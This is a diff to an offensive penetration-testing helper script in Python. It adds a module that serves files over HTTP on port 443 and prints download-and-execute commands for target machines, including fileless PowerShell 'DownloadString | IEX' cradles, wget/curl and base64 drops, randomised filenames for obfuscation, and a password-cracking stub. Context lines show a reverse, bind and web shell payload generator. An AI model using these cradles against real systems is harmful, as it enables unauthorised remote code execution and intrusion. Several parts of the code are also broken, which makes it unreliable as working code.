@@ -1,11 +1,14 @@
 #!/usr/bin/env python
 
+import os
 import sys
 import argparse
 import subprocess
 import random
 import hashlib
 import string
+import netifaces
+import time
 
 # RUN COMMONLY USED COMMANDS
 def run_command(args):
@@ -59,39 +62,142 @@ def create_payload(args):
         except KeyboardInterrupt:
             sys.exit(0)
 
-def transfer_file(args):
+# TRANSFER FILES TO
+def transfer_to(args):
+    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
+    relpath = args.filename
+    args.filename = os.path.basename(os.path.normpath(args.filename))
+
+    # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
+    rand_filename = ''.join(random.choices(string.ascii_letters, k=8))
+
+
     # PYTHON HTTP SERVER METHOD
-    if args.method == 'python_http':
-        print('[+] Starting HTTP server on ' + args.listen_ip + ':' + args.listen_port)
-        pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', args.listen_ip, args.listen_port], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    if args.method == 'http':
+        print('\033[1m[?] What IP address to listen on? ', end='')
+        print('\033[0m')
+        try:
+            listen_ip = input()
+        except KeyboardInterrupt:
+            sys.exit(0)
+        print('\033[1m[+] Starting HTTP server on 0.0.0.0 port 443 ...\033[0m')
+        try:
+            pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except KeyboardInterrupt:
+            sys.exit(0)
+        except:
+            print('\033[1m[!] Failed to start HTTP server\033[0m')
+            sys.exit(1)
+        
         print('[+] Run this command on target')
-        print('wget http://' + args.listen_ip + ':' + args.listen_port + '/' + args.filename)
-        print('OR')
-        print('curl http://' + args.listen_ip + ':' + args.listen_port + '/' + args.filename + ' -o ' + args.filename)
-        print('[?] Close Python HTTP server? [Y/n] ', end='')
+        if args.os == 'windows':
+            print('\033[1m[+] Select method:')
+            print('      1. DownloadFile')
+            print('      2. DownloadString - Fileless')
+            print('      3. Invoke-WebRequest')
+            print('      4. Invoke-WebRequest - Fileless')
+            print('[?] CHOICE: ', end='')
+            print('\033[0m')
+            choice = input()
+
+            if choice == '':
+                choice = '1'
+                print('\033[1m[+] DownloadFile method selected\033[0m')
+
+            if choice == '1':
+                print('\033[1m[+] DownloadFile method selected\033[0m')
+                print('\033[1m[?] Sync or Async? ', end='')
+                print('\033[0m')
+                sync = input().lower()
+                if sync == '':
+                    sync = 'sync'
+                    print('\033[1m[+] Using synchronous DownloadFile\033[0m')
+                if sync == 'async':
+                    print('\033[1m[+] Using asynchronous DownloadFile\033[0m')
+                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
+                    endcmd = ''
+                elif sync == 'sync':
+                    print('[+] Using synchronous DownloadFile')
+                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
+                    endcmd = ''
+            elif choice == '2':
+                print('\033[1m[+] DownloadString - Fileless method selected\033[0m')
+                choice = random.randint(1, 2)
+                if choice == '1':
+                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename + '\')'
+                    endcmd = ''
+                else:
+                    startcmd = '(New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename
+                    endcmd = '\') | IEX'
+            elif choice == '3':
+                print('\033[1m[+] Invoke-WebRequest method selected\033[0m')
+                startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
+                endcmd = ' -OutFile ' + rand_filename
+            elif choice == '4':
+                print('\033[1m[+] Invoke-WebRequest - Fileless method selected\033[0m')
+                startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
+                endcmd = ' | IEX'
+            else:
+                print('[!] Invalid choice')
+
+            command = startcmd + endcmd
+
+            # if args.firstlaunch:
+            #     command = startcmd + ' -UseBasicParsing' + endcmd
+            
+            print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
+            # if args.trust:
+            #     print('[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}')
+            print(command)
+            print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
+        elif args.os == 'linux':
+            print('\n[===== START LINUX COMMAND =====]\n')
+            print('wget https://' + listen_ip + '/' + args.filename)
+            print('\nOR\n')
+            print('curl https://' + listen_ip + '/' + args.filename + ' -o ' + '/tmp/' + rand_filename)
+            print('\n[====== END LINUX COMMAND ======]\n')
+
+        print('[?] Close HTTP server? [Y/n] ', end='')
+        time.sleep(1)
         pyterminate = input().lower()
         if pyterminate == '':
             pyterminate = 'y'
         if pyterminate == 'n':
-            print('[!] Python HTTP server was left open')
+            print('[!] HTTP server was left open')
         else:
             try:
                 pyserver.terminate()
-                print('[+] Python HTTP server succesfully terminated')
+                print('[+] HTTP server succesfully terminated')
             except:
                 print('[!] Could not terminate Python HTTP server')
 
     # BASE64 METHOD
     elif args.method == 'base64':
         print('[+] Generating Base64 string of file')
-        b64_file = subprocess.run(['base64', '-w', '0', args.filename], capture_output=True, text=True)
-        md5h = hashlib.md5(open(args.filename, 'rb').read()).hexdigest()
-        print('[+] MD5 hash is ' + md5h)
+        b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
+        md5h = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
         print('[+] Run this command on target')
-        print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
+
+        # ON WINDOWS POWERSHELL LESS THAN 8191 CHARACTERS
+        if args.os == 'windows':
+            finalcmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64_file.stdout + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
+            if len(finalcmd) <= 8191:
+                print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
+                print(finalcmd)
+                print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
+            else:
+                print('[!] cmd.exe has a maximum string length of 8,191 characters.')
+        # ON LINUX
+        elif args.os == 'linux':
+            print('\n[===== START LINUX COMMAND =====]\n')
+            print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
+            print('\n[====== END LINUX COMMAND ======]\n')
+
+
+        # VERIFY MD5 HASH
         while(True):
             try:
-                print('[?] Paste MD5 checksum here to compare: ', end='')
+                print('[?] Paste MD5 checksum output here to compare: ', end='')
                 md5c = input()
                 if md5c == md5h:
                     print('[+] MD5 checksum matches! You\'re good to go.')
@@ -104,13 +210,28 @@ def transfer_file(args):
     # SCP METHOD
     elif args.method == 'scp':
         print('[+] Uploading ' + args.filename + ' to ' + args.target_ip + ' ...')
-        rand_filename = ''.join(random.choices(string.ascii_letters, k=8))
         scp_connect = args.ssh_user + '@' + args.target_ip + ':/tmp/' + rand_filename
         res = subprocess.run(['scp', '-P', args.target_port, args.filename, scp_connect], capture_output=True, text=True)
         if res.returncode == 0:
             print('[+] File uploaded as /tmp/' + rand_filename)
         elif res.returncode == 255:
             print('[!] File could not be uploaded. Connection refused.')
+
+# CRACK PASSWORDS
+def password_crack(args):
+    print('[?] Which cracker would you like to use?')
+    print('      1) Hashcat [Default]')
+    print('      2) John The Ripper')
+    print('CHOICE [1/2]: ', end='')
+    crackprog = input().lower()
+
+    if crackprog == '':
+        crackprog = 1
+
+    if crackprog == 2:
+        print('[*] Not yet implemented')
+    else:
+        print('[*] Not yet implemented')
 
 def main():
     parser = argparse.ArgumentParser(
@@ -125,14 +246,21 @@ def main():
     )
 
     # PASSWORD CRACKING MODULE
-    crackpass = modules.add_parser('crackpass', help='method to crack password hashes')
+    crackpass = modules.add_parser('crackpass', help='Crack password hashes')
     crackpass.add_argument('filename', help='File that contains password hashes to crack')
 
-    # FILE TRANSFER MODULE FOR TRANSFERRING METHODS
-    filetransfer = modules.add_parser('filetransfer', help='methods to transfer files')
+    #############################
+    ### FILE TRANSFER MODULES ###
+    #############################
+    transferto = modules.add_parser('transferto', help='Semi-automated file transfer to target')
+    transferto.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
+    transferto.add_argument('method', help='Method of transferring', choices=['http', 'scp', 'base64'])
+    transferto.add_argument('filename', help='File to transfer')
+    transferfrom = modules.add_parser('transferfrom', help='Pastables to transfer from target')
 
+    '''
     # FILE TRANSFER METHODS
-    ftmethods = filetransfer.add_subparsers(
+    ftmethods = transferto.add_subparsers(filename
         title='Available Methods',
         dest='method'
     )
@@ -143,8 +271,10 @@ def main():
         help='$(python -m http.server <listen_port>)'
     )
     python_http.add_argument('listen_ip', help='IP to start http server on')
-    python_http.add_argument('listen_port', help='Port to start http server on')
     python_http.add_argument('filename', help='File to be transferred')
+    python_http.add_argument('os', help='Target operating system', choices=['linux','windows'])
+    python_http.add_argument('--trust', help='Bypass untrusted SSL/TLS certificate error', action='store_true')
+    python_http.add_argument('--firstlaunch', help='Bypass first-launch configuration', action='store_true')
 
     # BASE64 FILE TRANSFER METHOD
     b64 = ftmethods.add_parser(
@@ -152,6 +282,7 @@ def main():
         help='$(base64 -w 0 <filename>)'
     )
     b64.add_argument('filename', help='File to be transferred')
+    b64.add_argument('os', help='Target operating system', choices=['linux','windows'])
 
     scp = ftmethods.add_parser(
         'scp',
@@ -162,9 +293,10 @@ def main():
     scp.add_argument('ssh_user', help='SSH username')
     scp.add_argument('target_ip', help='Target to transfer file to')
     scp.add_argument('target_port', help='SSH port on target')
+    '''
 
     # RUN MODULE FOR COMMONLY USED COMMANDS
-    run_parser = modules.add_parser('run', help='commonly used commands')
+    run_parser = modules.add_parser('run', help='Commonly used commands')
     
     # RUN COMMANDS
     commands = run_parser.add_subparsers(
@@ -193,15 +325,11 @@ def main():
     )
     run_gbvhost.add_argument('target_url')
 
-    # PAYLOADS MODULE TO GENERATE SHELLS
+    ##########################################
+    ### PAYLOADS MODULE TO GENERATE SHELLS ###
+    ##########################################
     payloads = modules.add_parser('payloads', help='Reverse Shell, Bind Shell, and Web Shell')
-
-    # PAYLOADS
-    payloads.add_argument(
-        'shell',
-        choices=['reverse','bind','web'],
-        help='Type of shell'
-    )
+    payloads.add_argument('shell', choices=['reverse','bind','web'], help='Type of shell')
     payloads.add_argument('listen_ip', help='Listening IP address')
     payloads.add_argument('listen_port', help='Listening port')
     payloads.add_argument('os', help='Target operating system', choices=['linux', 'windows'])
@@ -209,14 +337,14 @@ def main():
 
     # PARSE ALL ARGS
     args = parser.parse_args() 
-
-    # MODULE SELECTION
     if args.module == 'run':
         run_command(args)
     elif args.module == 'payloads':
         create_payload(args)
-    elif args.module == 'filetransfer':
-        transfer_file(args)
+    elif args.module == 'transferto':
+        transfer_to(args)
+    elif args.module == 'crackpass':
+        password_crack(args)
     else:
         parser.print_help()
 
